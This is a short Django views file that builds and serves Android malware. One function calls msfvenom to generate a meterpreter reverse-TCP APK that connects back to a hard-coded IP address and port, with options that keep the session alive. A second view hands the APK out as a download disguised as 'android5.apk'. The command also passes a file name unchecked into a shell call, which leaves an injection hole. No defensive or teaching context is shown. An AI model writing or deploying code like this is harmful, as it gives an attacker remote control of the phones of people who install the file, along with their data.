from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader
from django.urls import reverse
from django.views.decorators.csrf import csrf_protect, csrf_exempt
from django.http import HttpResponse
from django.template import RequestContext
import threading
import os
import requests
import json
import subprocess
from subprocess import Popen, PIPE


def ssh_and_apk(HOST='45.56.113.154', PORT=101, apk_name='payload'):
    os.system(f'/opt/metasploit-framework/bin/msfvenom -p android/meterpreter_reverse_tcp LHOST={HOST} LPORT={PORT} AndroidWakelock=true AutoUnhookProcess=true SessionCommunicationTimeout=99999 > {apk_name}.apk',)
    print("done ")

def get_apk_file(request, apk_name):
    apk_file = open(f'{apk_name}.apk', 'rb')
    response = HttpResponse(apk_file, content_type="application/vnd.android.package-archive") 
    response["Content-Disposition"] = 'attachment; filename="android5.apk"'
    return response